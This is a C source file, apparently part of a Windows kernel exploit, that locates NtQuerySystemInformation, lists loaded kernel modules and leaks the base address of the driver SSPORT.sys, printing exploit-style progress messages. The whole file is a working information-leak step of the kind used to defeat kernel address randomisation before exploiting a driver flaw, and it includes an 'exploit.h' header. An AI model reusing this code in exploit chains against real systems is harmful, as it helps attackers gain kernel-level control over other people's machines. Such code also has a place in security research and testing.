#include "exploit.h"
#include "leak_utilities.h"

NtQuerySystemInformation _NtQuerySystemInformation = 0;

unsigned long long leak_ssport_base_address(HMODULE h_ntdll)
{
	PSYSTEM_MODULE_INFORMATION module_info = (void*)0;
	unsigned long return_length = 0UL;
	long status = 0L;
	unsigned char unused = 0;

	if (!_NtQuerySystemInformation)
	{
		_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(h_ntdll, "NtQuerySystemInformation");
		if (!_NtQuerySystemInformation)
		{
			printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" exported function. Error: %d (0x%x)", GetLastError(), GetLastError());
			unused = getchar();
			return 0;
		}
		printf("\n[+] Located the \"NtQuerySystemInformation\" exported function. Function Address: 0x%p", _NtQuerySystemInformation);
	}

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	module_info = (PSYSTEM_MODULE_INFORMATION)malloc(return_length);
	status = _NtQuerySystemInformation(SystemModuleInformation, module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information. NTSTATUS: %d (0x%x)", status, status);

	if (module_info)
	{
		for (int i = 0; i < module_info->ModulesCount; i++)
		{
			if (!strcmp_suffix(module_info->Modules[i].Name, "SSPORT.sys"))
			{
				printf("\n[+] Leaked the \"SSPORT.sys\" kernel base address. Kernel Base Address: 0x%p", module_info->Modules[i].ImageBaseAddress);
				return (unsigned long long)module_info->Modules[i].ImageBaseAddress;
			}
		}
	}
	printf("\n[-] Failed to leak the \"SSPORT.sys\" kernel base address.");

	unused = getchar();
	return 0;
}